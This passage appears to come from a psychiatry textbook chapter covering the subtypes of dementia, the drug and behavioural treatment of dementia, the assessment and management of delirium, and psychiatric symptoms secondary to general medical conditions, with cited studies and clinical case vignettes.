 Subacute Arteriosclerotic Encephalopathy (SAE) and ''Lacunar state'' both involve the small vessels of the brain. SAE is caused by thickening and narrowing (arteriosclerosis) of arteries that feed subcortical areas of the brain. SAE produces widespread, microscopic areas of damage to the deep layers of ''white matter.'' (NINDS, 2008). ''Lacunar state'' (lacunar disease) is due to occlusion of small, penetrating cerebral arteries, leading to  extremely small but deep infarctions (''lacunes''). Sometimes, these lacunes are so small as to produce no obvious deficits, or only pure motor or sensory deficits (Robinson &amp; Starkstein, p. 707). Lacunar state is often associated with hypertension and/or diabetes. The cavitary lesions (lacunae) characteristic of this condition are often found in the internal capsule, deep grey matter nuclei, and white matter. 
''Cerebral autosomal dominant arteriopathy with subcortical infarcts and leucoencephalopathy'' (CADASIL) is a rare, hereditary type of VaD that affects small blood vessels in the brain. An abnormality in the muscle cells surrounding these blood vessels gradually destroys the blood vessel cells. This may lead to migraines, emotional disturbance, stroke-like episodes, dementia, and other impairments (CADASIL Foundation, 2008).  CADASIL involves mutations of the Notch 3 gene on chromosome 19 (Joutel et al, 1996). There are also a growing number of genetically uncharacterized but familial small vessel diseases (Low et al, 2007). 

''Dementia with Lewy Bodies (DLB)''
	DLB does exist in genetic forms, including some autosomal dominant forms (Lerner &amp; Riley, p. 919).  There is significant pathophysiological overlap between DLB and Parkinson\’s Disease (PD), on the one hand; and DLB and SDAT, on the other. Thus, ''alpha-synuclein'' is a protein that appears to modulate synaptic transmission, and constitutes the major component of ''Lewy bodies''. These structures are the pathological hallmark of both PD and DLB, whether of a sporadic or familial origin (Lerner &amp; Riley, p. 914). 
There is considerable overlap between DLB and DAT. For example, ''neuritic plaques'' and ''neurofibrillary tangles'' are seen in autopsy studies of both DAT and DLB, though fewer neurofibrillary tangles are found in DLB (Samuel et al, 1997). Moreover, ''amyloid β'' (Aβ) pathology—one of the hallmarks of DAT—is often seen in DLB. Indeed, there is an interesting synergy between pathophysiological elements of DLB and DAT. For example, alpha- synuclein is a potent inducer of tau fibrillization, while Aβ  has been shown to promote Lewy body pathology in animal models (Giasson et al, 2003; Masliah et al, 2001). 

''Fronto-temporal dementia ''

	There appears to be a strong genetic loading in FTD. About 40% of FTD patients have a family history of a similar disorder in close relatives, and in the vast majority of cases, there is an autosomal dominant inheritance pattern. Autosomal dominant mutations in the ''tau'' gene on chromosome 17 have been discovered in FTD, and—like DAT-- FTD is generally considered a &quot;tauopathy.&quot; However, &quot;tau-negative&quot; forms of FTD have been described, including one form that often presents with concomitant ''amyotrophic lateral sclerosis ''(ALS) (Apostolova &amp; Cummings, 2008; Lantos &amp; Cairns, 2001). 
Pick\’s Disease (frontal variant FTD) produces striking frontal, temporal, or combined (fronto-temporal) atrophy. Microscopically, the hallmark are  spherical, tau-based inclusion bodies, termed ''Pick\’s bodies'', which may be seen in neurons and glial cells. Neuronal loss and swelling are also commonly seen in Pick\’s Disease. In tau-negative forms of FTD, neuronal loss, gliosis, and microvacuolation are the sole microscopic findings. 

* '''Ethno-cultural and racial factors in dementia'''

Ethnic, cultural, and racial factors play a role in the assessment of dementia and, to some extent, on its course and outcome. For example, most diagnostic tests for dementia are based on cognitive assessments not yet validated for various ethnic groups. Moreover, emigration of some ethnic groups may affect dementia prevalence, as demonstrated by higher rates of dementia among Japanese-Americans than among Japanese cohorts in Japan (Iliffe &amp; Manthorpe, 2004). Ethnic and cultural factors may also affect caregiver attitudes and behavior. For example, Latina dementia caregivers may delay institutionalization significantly longer than female Caucasian caregivers, perhaps reflecting more tolerant Latino cultural attitudes toward caregiving (Mausbach et al, 2004). Similarly, Shaw et al (1997) found lower rates of depressive symptoms in Chinese, as compared with American, caregivers of demented patients, possibly reflecting greater acceptance of traditional family roles among the Chinese subjects. Finally, ethnicity and race may play a role even in the symptomatic expression of dementia, with different ethnic and racial groups showing varying rates of aggressive behaviors, wandering, and hallucinations (Sink et al, 2004). 

'''Treatment of Dementias'''
'''	'''''Pharmacotherapy''

''	''By far the most experience with pharmacotherapy has been in patients with DAT, and our discussion necessarily focuses on this condition. The mainstay of drug therapy in dementia is a group of agents called ''cholinesterase inhibitors'' (CIs), including donepezil, galantamine, and rivastigmine. (Another CI, tacrine, is rarely used nowadays in most industrialized countries, owing to its hepatotoxic effects). Comprehensive discussion of these agents may be found in Jacobson et al, 2007. All CIs act to inhibit the enzyme ''acetylcholinesterase'', which metabolizes the neurotransmitter, acetylcholine. Rivastigmine also inhibits butyrylcholinesterase, and galantamine is an allosteric modifier of the nicotinic acetylcholine receptor. There is no convincing, randomized, controlled evidence showing any one of these drugs as markedly superior to the others. Indeed, the efficacy of this group of agents appears to be modest-to-moderate, with most studies of DAT finding that the CIs mainly slow the rate of cognitive decline and/or delay nursing home placement.  One meta-analysis of 13 randomized, double blind, placebo controlled trials demonstrated that 6-12 months of treatment with donepezil, galantamine or rivastigmine in mild, moderate or severe DAT produced about a 3 point drop in scores on the 70-point ADAS-Cog Scale. Benefits were also seen on measures of activities of daily living and behavior. But as the authors note, &quot;none of these treatment effects (is) large.&quot; (Birks, 2006). The other drug used in most countries for DAT is ''memantine'', which blocks the action of glutamate at the NMDA receptor, under conditions of excessive glutamate activity (Jacobson et al, 2007). This is thought to slow neurodegeneration in DAT, and there is evidence of memantine\’s benefits in moderate-to-severe DAT. In some instances, memantine may be combined with one of the CIs, but long-term data on outcome are few. 
Although atypical ''antipsychotics'' are often used—and sometimes, overused—in patients with DAT, they are not without risk in dementia-prone populations, particularly when ''vascular risk factors'' are present. In the U.S., the Food &amp; Drug Administration (FDA) issued, in June 2008, an advisory to physicians, stating the following (FDA, Alert, 6/16/08):

\*  Elderly patients with dementia-related psychosis treated with conventional or atypical antipsychotic drugs are at an increased risk of death.

    \* Antipsychotic drugs are not approved for the treatment of dementia-related psychosis.  Furthermore, there is no approved drug for the treatment of dementia-related psychosis.  Healthcare professionals should consider other management options.

* Physicians who prescribe antipsychotics to elderly patients with dementia-related psychosis should discuss this risk of increased mortality with their patients, patients\’ families, and caregivers.

Notwithstanding these serious concerns, some patients with DAT and psychotic features and/or severe behavioral disturbance (e.g., extreme agitation or aggressive violence) may require and benefit from low doses of atypical antipsychotics; e.g., risperidone 0.5 mg/day or olanzapine 5 mg/day (Alexopoulos et al, 2004).  However, attempts at behavioral modification (see below) and alternative therapies (such as the SSRI ''citalopram'') should be considered (Pollock et al, 2007). As a recent review by Ellison (2008) put it: 

&quot;…several of the atypical antipsychotics remain reasonable choices when used in patients whose vascular risk factors do not outweigh their behavioral treatment needs. The atypical antipsychotics have not been proved to control agitation over an extended period of time and should be used at the lowest effective doses and for the shortest interval necessary, with sufficient psychoeducation and disclosure of risks to caregivers and relatives.&quot;

	Treatment of vascular dementia (VaD) should first focus on mitigation of known risk factors, such as hypertension, diabetes, atrial fibrillation, and hyperlipidemia. Studies regarding use of CIs for vascular dementia are plagued by methodological problems, such as inclusion of those whose dementia probably involves some DAT-type pathology and cholinergic system dysfunction; nonetheless, there is modest and growing evidence that the CIs may be helpful in subgroups of patients with VaD. Similarly, Dementia with Lewy Bodies (DLB) also involves reduction of brain acetylcholine—perhaps surpassing those seen in DAT--and the CIs may sometimes be useful in DLB (Jacobson et al, 2007; ). Patients with DLB are exquisitely sensitive to the extrapyramidal side effects of antipsychotics, and both typical and atypical agents (with the possible exception of clozapine) are generally to be avoided in DLB patients.  

''Psychosocial and behavioral interventions''


''	''Whenever possible, the clinician should initiate non-pharmacological interventions when managing behavioral disturbances in patients with dementia. Such behavioral approaches are aimed at ameliorating physical, environmental and psychosocial stressors that may lead to agitation, pacing, aggression, and related behavioral disturbances (Salzman et al, 2008). For example, dysfunctional verbal and physical behaviors—such as repetitive shouting, pacing, punching, etc.—may reflect unrecognized pain, loneliness, depression, boredom, or other social stressors. A variety of behavioral interventions may be helpful in this context; e.g., structured socialization, &quot;pet therapy&quot;, viewing family videotapes, and training programs for family caregivers. It is also important to review the patient\’s medical status and medications, since adverse drug effects or interactions may sometimes contribute to confusion and agitation (Jacobson et al, 2007; Salzman et al, 2008). There are relatively few well-controlled studies of non-pharmacological interventions in dementia; nevertheless, a number of promising investigational approaches are under investigation, including aroma therapy and music therapy (Raglio et al, 2008). 

	''Special Populations''

There are several subgroups of demented patients who merit special attention and interventions. Patients with ''HIV-related dementia'' in the late stages, for example, may exhibit behavioral disinhibition, mania, and psychotic features, such as delusions and hallucinations. Primary treatment of HIV/AIDs is aimed at suppression of viral load by means of anti-retroviral therapies. Some evidence suggests that the nucleoside analog reverse transcriptase inhibitor (NRTI) ''zidovudine'' (also known as AZT) may attenuate the symptoms of HIV-related dementia and neurological impairment in some patients; however, zidovudine and related agents may themselves provoke ''neuropsychiatric complications'', such as depersonalization, mania, and delirium (Fernandez &amp; Tan, 2008). Cognitive functioning in HIV dementia patients may be improved by methylphenidate; psychotic symptoms may respond to atypical antipsychotics, such as risperidone or olanzapine. Depression in HIV/AIDS is not uncommon, but may stem from a complex mix of direct effects of HIV on the CNS, and psychosocial factors. 
Antidepressants such as citalopram and escitalopram may be useful, but this patient population is particularly susceptible to drug-related side effects and interactions. Thus, any pharmacotherapy aimed at neuropsychiatric symptoms must be very carefully monitored in this population (Fernandez &amp; Tan, 2008).
As noted above, ''Dementia with Lewy Bodies'' (DLB) poses particular management problems. Psychotic symptoms, including visual hallucinations, are a central feature of DLB, and the sensitivity of these patients to antipsychotics makes treatment especially challenging. Cholinesterase inhibitors, such as rivastigmine, may ameliorate some neuropsychiatric symptoms in DLB patients, including hallucinations, paranoid delusions, apathy, aggression, and agitation (Simard &amp; van Reekum, 2004; Apostolova &amp; Cummings, 2008). If an antipsychotic must be used in DLB with psychosis, classic neuroleptics should be avoided; initiating treatment with very low doses of quetiapine or clozapine is sometimes warranted (Jacobson et al, 2007). 
''Depression'' as a feature of dementia represents a diagnostic and treatment challenge. As noted earlier, depression is commonly seen in patients with Parkinson\’s Disease, Huntington\’s Disease, DAT, and LBD, as well as in those with a history of stroke or other form of VaD. Depression may represent a prodrome to dementia or a feature of established dementia. The recently described ''amyloid-associated depression'' may represent such a prodome in DAT (Qiu et al 2008).  ''Vascular depression'' (Sneed et al, 2008, Alexopolous, 2006) may present as new-onset of depressive illness in those affected by diffuse or focal vascular lesions, and is increasingly recognized in older individuals. Conversely, the &quot;dementia of depression&quot; (formerly called ''depressive pseudodementia'') is a reversible cognitive impairment directly related to the patient\’s mood disorder. Features such as ''excessive guilt, low self-esteem, self-loathing, or persistent suicidal ideation'', as well as ''delayed responses to cognitive questions,'' are useful &quot;red flags&quot; for the presence of depression in dementia. The Cornell Scale for Depression in Dementia may be helpful in detecting this problem. Depressed patients with dementia often respond to lower doses of antidepressants (such as citalopram or sertraline) than do non-demented depressed patients (Jacobson et al, 2007).  
''Delirium'' is a common complication of both HIV-related dementia and DLB, and is discussed in the section on Delirium. Co-morbid dementia and delirium is also discussed in the section on Delirium. 
''Case Vignette: Mr. J. was a 78-year-old nursing home patient with dementia of the Alzheimer type (DAT). The staff were concerned and distressed by Mr. J\’s frequent &quot;moaning&quot; or &quot;yelling&quot;, particularly in the evening, and believed these behaviors were adversely affecting the other residents of the home. Mr. J. was prescribed risperidone 1.0  mg at h.s. His yelling diminished after only two days of treatment. However, he developed significant orthostatic  hypotension and akathisia, and continued to &quot;moan&quot; nearly every night. A comprehensive medical evaluation revealed that Mr. J. suffered from severe osteoarthritis, which was worsened with attempts by the &quot;night shift&quot; nurses to reposition Mr. J. in his bed. A combination of acetaminophen and local heat application led to considerable relief and marked reduction in Mr. J\’s verbal outbursts. ''  
''Risperidone was reduced to 0.25 mg at h.s., with significant improvement in Mr. J\’s akathisia and hypotension''. 

'''DELIRIUM'''

'''Phenomenology (Characteristic Features of Delirium)'''

Delirium may be defined as ''an acute or subacute disturbance in cerebral functioning leading to impairment in one\’s level of consciousness, orientation, memory, and attention'', usually characterized by &quot;waxing and waning&quot; over hours or days. Common accompaniments of delirium include altered sleep-wake pattern; labile mood; speech disturbance; restlessness or agitation; perceptual abnormalities; and sometimes, psychotic features. Older terms for delirium include &quot;acute organic brain syndrome,&quot; &quot;cerebral insufficiency,&quot; and &quot;acute confusional state.&quot; Not uncommonly, delirium may be superimposed on dementia, a condition sometimes termed &quot;beclouded dementia&quot; (Sadock &amp; Sadock, 2007). 

''Epidemiology''
Delirium is a very common problem, particularly in emergency, medical-surgical, inpatient, and geriatric settings, such as nursing homes (Levkoff et al, 1991). Substance-abuse and oncology treatment centers also have high rates of delirium (Tasman et al, 1998). Among medical inpatients, the prevalence of delirium ranges from 11-16%, while among elderly patients admitted for acute hospital care, the prevalence ranges from 24-65%. Among elderly patients over age 65, hospitalized for a general medical condition, 10-15% will develop delirium while in the hospital. In general delirium tends to be more common among the very young and the very old, but can affect anyone at any age. Delirium is associated with longer hospital length of stay and mortality in medical surgical inpatients.

''Subtypes of Delirium and Classification''

	Delirium is sometimes characterized according to the predominant disturbance in motor behavior; i.e., as ''excited'' (&quot;hyperactive&quot;), ''lethargic ''(&quot;hypoactive&quot;) or ''mixed'' delirium (Trzepacz &amp; Meagher, 2008). Some evidence indicates that these motor subtypes have implications for etiology, pathophysiology, presence of non-motor symptoms, and prognosis. Thus, some evidence suggests that patients with hyperactive delirium may have a better prognosis and a lower mortality rate. Hypoactive delirium may be more likely to go undetected, as one might expect from the lack of obvious agitation. However, the definition of these subtypes varies considerably among clinicians and researchers, and their reliability has been questioned. 
Another way of considering delirium is expressed by the terms &quot;excitatory&quot; and &quot;inhibitory&quot; syndromes, which we will discuss under Pathogenesis (Ferner, 2003). 
Delirium with ''psychotic features''—including delusional misidentification and hallucinations—may be particularly distressing to the patient, even after resolution of the delirium (Trzepacz &amp; Meagher, 2008). 
	There are several ways delirium may be classified. In the ICD-10 (1993), the main categories are:
# [Delirium, Not Induced By Alcohol And Other Psychoactive Substances-http://www.mentalhealth.com/icd/p22-or01.html] 
# [Delirium, Not Superimposed On Dementia, -http://www.mentalhealth.com/icd/p22-or01.html] 
# [Delirium, Superimposed On Dementia-http://www.mentalhealth.com/icd/p22-or01.html] 
# [Other Delirium-http://www.mentalhealth.com/icd/p22-or01.html] 
In contrast, the DSM-IV categorizes delirium according to four very broad etiologies: delirium due to ''general medical condition''; ''substance intoxication'' delirium; ''substance withdrawal'' delirium; and delirium due to ''multiple etiologies''. Delirium related to substance intoxication or withdrawal will be discussed in Chapter (   ). 
The number of general medical conditions (GMCs) causing delirium is legion. Some common GMCs include ''fluid and electrolyte abnormalities, hypoglycemia, infection or sepsis, head trauma, hepatic encephalopathy, viral encephalitis, renal failure, COPD and brain tumor or hemorrhage.'' A plethora of both prescribed and over-the-counter medications can provoke delirium, including ''analgesics, antibiotics, cardiac medications, anticholinergic agents, psychotropic agents'', and a variety of ''botanicals'', such as jimsonweed. (Sadock &amp; Sadock, 2007)

	''Case vignette'': ''An 84 year-old woman with a history of mild congestive heart failure, osteoarthritis, and moderate cognitive impairment thought possibly due to very early DAT appeared confused, disoriented, and hallucinating. She complained of seeing &quot;green faces&quot; and was initially diagnosed as &quot;psychotic.&quot; Physical exam and routine laboratory measures were within normal limits. Her regular medication included digoxin 0.25 mg/day (digoxin level = 0.6 ng/ml; therap=0.5-2.0). Owing to her arthritic pain, she recently had been started on ibuprofen 400 mg tid.''
''A repeat digoxin level shortly after admission showed the level to be 1.2 ng/ml (WNL). An EEG showed slowing of alpha rhythm (7-8 Hz, normal=8-12). The increase in digoxin levels was attributed to the effect of the NSAID, ibuprofen (Goldfrank, 2002). Though the absolute level of digoxin was still within the normal range, its doubling  within a short period of time evidently set off the patient\’s confusion. Abnormal color perception—particularly in the green or yellow end of the spectrum (xanthopsia)—is a classic sign of digoxin toxicity (Piltz et al, 1993). ''

''Assessment and Diagnostic Testing''

''	''Delirium remains a clinical diagnosis'', ''with a careful ''history, physical exam, mental status exam, and review of medication and laboratory findings ''as the most useful diagnostic &quot;instruments&quot; (Sadock &amp; Sadock, 2007).  Typically, the onset of delirium is acute (over a period of hours, days, or in some cases weeks) and there is a marked change from the patient\’s &quot;baseline&quot; cognitive state. A recent change in medication; recent substance abuse/discontinuation; or some recent medical or neurological event (fall, infection, stroke, etc.) may provide the critical historical clues. The classic findings on mental status include a fluctuating level of consciousness (e.g., the patient &quot;nods off&quot; or drifts in and out of awareness); inability to pay attention to the examiner; disorientation to date and place (though intact orientation does ''not'' rule out delirium); impaired recent memory (e.g., inability to recall 3 of 3 items after 5 minutes); and associated features, such as disorganized thought processes (tangentiality, loose associations), perceptual abnormalities (auditory, and particularly, prominent ''visual'' or ''tactile'', hallucinations); and psychomotor abnormalities (agitation, slowing). Affect may be quite labile, and delusions may also be present. 
	When delirium is superimposed upon dementia, it appears that delirium phenomenology generally overshadows that of the dementia. Thus, delirium tends to present similarly regardless of whether it is accompanied by dementia. The clinical maxim should be, &quot;altered mental status reflects delirium until proven otherwise,&quot; in order to prevent misattribution of delirium to the more chronic brain syndrome of dementia (Trzepacz &amp; Meagher, 2008, p. 451). History from family members or caregivers may provide critical information suggesting a more acute change in functioning.
	''Physical examination'' may be difficult in an agitated, delirious patient, but every effort must be made to rule out head trauma, acute neurological events, and severe autonomic dysfunction (such as marked hypotension). Pulse, blood pressure, temperature, respirations should all be checked. An examination of the head and neck—including papillary function and extraocular movements—should be carried out. A basic assessment of heart, lungs, and neurological function should be obtained. Specific physical findings may provide a clue as to the etiology of the delirium. For example, a patient with ''papilledema and hypertension'' may be experiencing hypertensive encephalopathy; ''nuchal rigidity'' may point to meningitis or subarachnoid hemorrhage (Sadock &amp; Sadock). One helpful clue may be ''pupillary findings'': in cases of anticholinergic toxicity, pupils may be dilated but sluggish; in cases of &quot;hyper-adrenergic&quot; delirium (e.g., in sedative withdrawal, amphetamine/cocaine intoxication, or hyperthyroid storm), pupils may be dilated by briskly ''reactive'' (Ferner, 2003). 
	Adjunctive ''screening instruments'' for detecting delirium include the CAM (Confusion Assessment Method); the CTD (Cognitive Test for Delirium); and the DRS-R98 (Delirium Rating Scale, Revised 98). The CAM is probably the most widely used delirium screening test in general hospital settings, and is based on DSM-III criteria (Trzepacz &amp; Meagher, 2008). Recently, Fanjiang &amp; Folstein (2001) developed a simple screening scale for use by medical students, called the ''Three Item Delirium Scale''. This requires the presence of ''altered consciousness'' plus either ''cognitive impairment'' or ''hallucinations''; preliminary data suggest good sensitivity and specificity for delirium (Trzepacz &amp; Meagher, 2008). 
''	Laboratory measures and ancillary testing: ''There is no pathognomonic &quot;test&quot; for the diagnosis of delirium. However, it is important to obtain routine laboratory studies on all delirious patients, including—most urgently--complete blood count, electrolytes 
( including calcium, magnesium, and phosphate), renal and hepatic functions (including ammonia), serum glucose and erythrocyte sedimentation rate. Thyroid functions should also be checked. A blood and/or urine screen for drugs of abuse is helpful, and serologic tests for syphilis (such as VDRL) and HIV infection may also be indicated. An electrocardiogram (EKG) and chest radiograph are usually appropriate, in order to rule out cardiac arrhythmia, silent ischemia, or occult pneumonia among other causes. A bedside test for oxygenation is also useful. An electroencephalogram (EEG) is often advised as a standard study in the work up of delirium (Sadock &amp; Sadock, 2007), since the EEG often reveals either generalized slowing or focal areas of hyperactivity. (Serial EEGs may also be helpful in following the &quot;progress&quot; of treatment, in that one may see restoration of normal (8-12 Hz) alpha rhythm as the delirium resolves). Depending upon history and specific medical presentations, ancillary tests, such as lumbar puncture, blood cultures, B12 level, and structural brain imaging (CT, MRI) may be clearly indicated. It is important to note that correction of underlying metabolic, electrolyte, or other abnormalities does not necessarily lead to immediate resolution of the delirium; typically, there is a &quot;lag&quot; between such corrections and the patient\’s level of consciousness. This is particularly true in those circumstances where CNS drug levels (e.g. lithium) may normalize more slowly than blood levels; or when correction of blood abnormalities 
(such as high glucose or sodium) needs to occur slowly, in order to prevent CNS complications.  One should treat the ''patient'', not the &quot;lab slip&quot;! 
''Pathogenesis of Delirium''
Even though delirium may arise from a multitude of underlying causes, several unifying hypotheses have been advanced to explain the general mechanisms of most delirious states (Ferner, 2003). One such hypothesis emphasizes the balance between ''excitatory and inhibitory neurotransmission'' in the brain, and derives a broad separation of brain syndromes on this basis. For example, ''excitatory delirium syndromes'' may involve excessive augmentation of excitatory neurotransmitters, such as glutamate, dopamine and norepinephrine (serotonin may also be considered excitatory to some degree). Antagonism of certain cholinergic receptors, on this view, also constitutes an &quot;excitatory&quot; effect. Thus, delirium syndromes as diverse as amphetamine toxicity and poisoning with the anticholinergic agent benztropine would be predicted to have similar excitatory effects, including ''agitation, tachycardia, hypertension ''and ''fever.'' (Anticholinergic syndromes may present with the classic and memorable findings of &quot;hot as a hare, mad as a hatter, red as a beet, dry as a bone&quot;; i.e., ''fever, agitated confusion or psychosis; red skin; ''and'' dry mouth''). 
''Inhibitory delirium syndromes'', in Ferner\’s view (Ferner, 2003), involve agents that augment the inhibitory neurotransmitter, GABA, or act as agonists at the mu opioid receptor. Thus, in large quantities, GABA agonists such as benzodiazepines (and to some degree, ethanol) or opioids such as morphine may cause delirious states characterized by ''drowsiness, ataxia, respiratory suppression, ''and'' slurred speech.'' Pathological alterations in GABA activity--perhaps amplified by an endogenous toxin that binds to benzodiazepine receptors--have also been implicated in hepatic encephalopathy (Rummans et al, 1995). In some cases of inhibitory syndromes, &quot;paradoxical&quot; agitation may result from disinhibition of higher brain centers that normally suppress aggression or agitation (Ferner, 2003).
Another unifying hypothesis focuses specifically on ''low'' ''cholinergic ''and ''high dopaminergic transmission ''in delirium (Trzepacz &amp; Meagher, 2008),
as well as derangements in ''non-dominant, posterior parietal ''and'' prefrontal cortices.'' Other brain regions, including the brain stem, basal ganglia and thalamus, are likely to be involved. Importantly for the cholinergic hypothesis, a variety of disease states causing delirium are associated with cholinergic deficiency; e.g., thiamine deficiency, hypoxia, and hypoglycemia all ''reduce acetylcholine'' by affecting the oxidative metabolism of glucose and production of acetyl coenzyme-A (Trzepacz &amp; Meagher, 2008). 
The pathogenesis of delirium must also consider predisposing medical risk factors, though, as Trzepacz and Meagher note, these must not be confused with ''causes'' of delirium. Predisposing factors include but are by no means limited to: ''genetic risk factors'' (such as APOE4 genotype); ''old age''; ''pre-existing cognitive impairment; use of multiple medications'' (especially anticholinergic agents and opioids); ''pre-existing cerebrovascular accident/stroke''; and ''vitamin'' (especially thiamine) ''deficiency'' (Trzepacz &amp; Meagher, 2008). 
To some degree, psychological factors, as well as quality of hospital care, may also influence certain aspects of delirium. As Mohta et al (2003) have pointed out, the experience of being in the intensive care or trauma unit may activate various psychological defense mechanisms, such as denial, regression, anger, anxiety and depression. Delirium itself may, in some cases, represent a regressive defense, though  such psychodynamic hypotheses must never vitiate the clinician\’s search for specific physiological precipitants. 
The likelihood of delirium may also be influenced by the kind of care the patient receives. For example, Inouye and coworkers (1999) evaluated 852 hospitalized older patients who were nonrandomly assigned to usual care or management with a multi-pronged intervention designed to minimize risk factors for delirium. These protocols included repeated reorientation of the patient; provision of cognitively stimulating activities; a nonpharmacologic sleep protocol; early mobilization activities and range of motion exercises; timely removal of catheters and physical restraints; use of eyeglasses and hearing aids; and early correction of dehydration. These interventions significantly reduced the incidence of delirium (15.0% in the usual care group versus 9.9% in the intervention group). 

	''Treatment and Management of Delirium''

''		''The primary treatment of delirium entails diagnosing and correcting the ''underlying cause'' of the brain dysfunction. Thus, if an electrolyte disturbance appears to be the causal factor, one corrects it; if an infection seems to be &quot;driving&quot; the delirium, one treats it with appropriate anti-microbials (which may also provoke confusional states). If the patient\’s delirium appears due to a newly-prescribed medication, that agent is held or discontinued immediately, if clinically safe and feasible. (If one must avoid a superimposed withdrawal syndrome, the offending agent is tapered off and discontinued as rapidly as possible). 
There are some &quot;cause-specific&quot; agents that treat a few narrowly-defined types of delirium. For example, in cases of known or suspected anticholinergic-induced delirium, the cholinesterase inhibitor, ''physostigmine'', is indicated (and in the U.S., has FDA-approved labeling for this use). However, physostigmine is not without its own side effects, such as bradycardia. In cases of known or suspected alcohol withdrawal-related delirium (delirium tremens, &quot;DTs&quot;), a ''benzodiazepine'' is the treatment of choice (see Chapter ….). For benzodiazepine-induced delirium, limited data suggest that the benzodiazepine antagonist, ''flumazenil'', may be useful (Olshaker &amp; Flanigan, 2003). 
In many cases of delirium, a specific cause is not identified, or multiple causes are suspected. If, after a thorough medical evaluation, no specific etiology is found, one is left to &quot;manage&quot; the neurobehavioral complications of delirium as effectively and safely as possible—and without making matters worse. Unfortunately, many psychotropic agents used to manage the behavioral complications of delirium (such as agitation or disinhibted behavior) may themselves cause confusion or exacerbation of the delirium. Thus, treatment should be as conservative as possible, avoiding high doses, or agents whose mechanisms of action overlap with those of drugs implicated in causing the delirium. For example, the hallucinogen, phencyclidine (&quot;PCP&quot;, &quot;Angel Dust&quot;) has complex effects on acetylcholine (Helman &amp; Habal, 2006) that may be exacerbated if one treats PCP-induced psychosis with a highly anticholinergic phenothiazine. 
For management of neurobehavioral complications of delirium (marked agitation, aggression, tearing out IV lines, etc.), the agents of choice remain the higher-potency neuroleptics, particularly haloperidol (5-40 mg/day, in divided doses) (Inouye, 2006a). Although larger doses have been used intravenously, particularly in ICU or SICU settings, these agents have risk of producing torsades des pointe arrythmias, which have been associated with lethal ventricular arrythmias, particularly in patients with hypovolemia, hypomagnesemia or other electrolyte abnormalities. (Hassaballa &amp; Balk, 2003).  
There is, however, increasing interest in use of newer &quot;atypical&quot; antipsychotics in this setting, and some limited data suggest they may be safe and effective (Han &amp; Kim, 2004). Although benzodiazepines, such as lorazepam, are often administered to delirious patients, this group of agents carries significant risks in this population; e.g., paradoxical &quot;disinhibition,&quot; worsening, or prolongation of the patient\’s confusion (Inouye, 2006 a,b). With the exception of delirium tremens, there are few instances of delirium in which benzodiazpines would be indicated. 
There is also considerable interest in—but only preliminary evidence for—the use of ''cholinesterase inhibitors'' such as ''donepezil'' (see above, re: DAT) in delirium. Preliminary evidence has been mixed, and clinical observation suggests that any beneficial effects on confusion and memory impairment are modest and slowly-achieved (Jacobson et al, 2007). One recent controlled study (Liptzin et al, 2005) was &quot;…unable to demonstrate a benefit for donepezil in preventing or treating delirium in a relatively young and cognitively-intact group of elderly patients undergoing elective orthopedic surgery.&quot; 
''Non''-pharmacologic approaches to the delirious patient are an important part of good care, and include provision of &quot;orienting cues&quot;, such as clocks and calendars; continuity of nursing care; placement of familiar objects (such as a family picture) near the patient; and therapeutic use of friends and family to create a familiar and calming environment (Rummans et al, 1995). Finally, primary prevention of delirium involves a comprehensive strategy, including: 1) recognizing and mitigating known risk factors such as dehydration, sleep deprivation, hearing impairment, etc. (Inouye et al, 1999); 2) proactive geriatric consultation, prior to planned surgery; and 3) education of staff charged with the care of high-risk patients (Trzepacz &amp; Meagher, 2008). 

'''Psychiatric Symptoms Secondary to General Medical Conditions'''

''	''There is a complex and multidimensional relationship between psychiatric and medical illnesses. Psychiatric illness can be exacerbated by the presence of co-morbid medical illness and its management can be made more complex by pharmacologic or other management needs of medical illness. Psychiatric illness can present in general medical settings with medical symptoms secondary to psychiatric illness. Finally psychiatric disorders can be directly caused by the presence of known or occult medical/neurological illness.  In this section, we will focus on this last category. 
In the DSM-IV, this heterogeneous group of diagnoses comprises six main categories: ''psychotic disorders, mood disorders, anxiety disorders, catatonic disorders, personality alterations, ''and'' amnestic disorders''. In the ICD-10, the term &quot;organic&quot; is applied to the first five categories; e.g., ''organic hallucinosis ''and'' organic delusional disorder; organic mood \[affective\] disorder; organic anxiety disorder; organic catatonic disorder; ''and'' organic personality disorder''. We have already alluded to what we view as philosophical problems with the term &quot;organic&quot;. For this reason, we will use the neutral designation, ''psychiatric symptoms secondary to general medical conditions'' (Psy-GMCs) as a &quot;bridging&quot; term to encompass both the DSM and ICD categories. 

''Prevalence in selected settings''

''	''The community prevalence of psychiatric symptoms secondary to general medical conditions (Psy-GMCs) is not well-established, nor is it straightforward to determine. Data from a consultation-liaison service, however, provide some sense of how common Psy-GMCs may be in certain high-risk medical settings.  For example, Rundell and Wise (1989) reviewed  755 cases seen by the psychiatric C-L service in a general hospital.  Fully 38% of depressed patients had some underlying medical or neurological disorder as the likely cause of their depression. The most frequent diagnoses were cerebrovascular accident; Parkinson\’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis. With respect to manic syndromes on this C-L service, the findings were even more striking: ''87% of manic patients ''had a diagnosis of &quot;organic mood disorder.&quot; The most commonly-implicated causes of this &quot;secondary mania&quot; were corticosteroids, human immunodeficiency virus (HIV) infection, and temporolimbic epilepsy. Psychiatric clinic populations may also show a high prevalence of GMCs associated with psychiatric symptoms. Thus, Koranyi (1979) found that in a psychiatric clinic population, 18% had psychiatric symptoms that could be attributed solely to an underlying—and undetected—medical problem. On the other hand, in routine, non- general hospital, psychiatric inpatient settings, some types of Psy-GMCs may be quite rare. For example, Lo et al (2007) found that the prevalence of &quot;organic delusional disorder&quot; according to DSM-III-R criteria was only 0.4% of total inpatient psychiatric admissions. 

	''General features and phenomenology of Psy-GMCs''

''	''There are no pathognomonic signs that reliably distinguish  psychiatric disturbances due to general medical  (&quot;organic&quot;) conditions (Psy-GMCs) from those due to primary psychiatric disorders. For example, with respect to ''manifestations of the'' ''depression itself'', there are no singular objective features that would unequivocally distinguish, say, depression due to ''folic acid deficiency'' from depression seen in a typical ''major depressive episode''. However, careful attention to (1) the onset, history, and course of the present illness; (2) the patient\’s age, prior medical and psychiatric illnesses, and family history; as well as (3) accompanying physical and laboratory findings, may all be of help. 
For example, depressive, manic, anxious, or psychotic symptoms that appear to &quot;track with&quot; (correspond closely in time and intensity) the course of an underlying medical disorder may prove to be secondary to that disorder (see '''Case Vignette'''). Similarly, the onset of psychiatric symptoms following the introduction, discontinuation, or change in dosage of a particular drug should always raise the prospect of a &quot;secondary&quot; psychiatric syndrome. 
